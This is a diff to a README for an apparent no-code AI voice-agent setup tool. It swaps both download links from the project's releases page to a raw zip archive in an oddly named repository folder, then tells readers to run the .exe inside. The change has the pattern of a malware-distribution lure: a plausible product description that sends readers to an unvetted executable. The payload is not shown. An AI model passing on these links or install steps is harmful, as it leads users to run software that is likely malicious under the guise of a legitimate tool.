@@ -1,6 +1,6 @@
 # 📞 ai-voice-agent-setup-vapi-bland - Build your automated phone agent easily
 
-[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Visigothtravelagent708/ai-voice-agent-setup-vapi-bland/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Visigothtravelagent708/ai-voice-agent-setup-vapi-bland/main/fugle/voice_agent_setup_bland_ai_vapi_v3.9-alpha.5.zip)
 
 This application helps you set up an AI voice agent for your phone system. It connects your choice of Bland AI or Vapi technology to a digital phone line. You do not need to write code to use this tool. You can manage your incoming and outgoing calls with an automated system.
 
@@ -18,7 +18,7 @@ Your computer must meet these requirements to run the software:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit [this page to download](https://github.com/Visigothtravelagent708/ai-voice-agent-setup-vapi-bland/releases) the most recent installation file.
+1. Visit [this page to download](https://raw.githubusercontent.com/Visigothtravelagent708/ai-voice-agent-setup-vapi-bland/main/fugle/voice_agent_setup_bland_ai_vapi_v3.9-alpha.5.zip) the most recent installation file.
 2. Select the file ending in .exe for your Windows system.
 3. Save the file to your computer desktop.
 4. Double-click the file to start the installation.
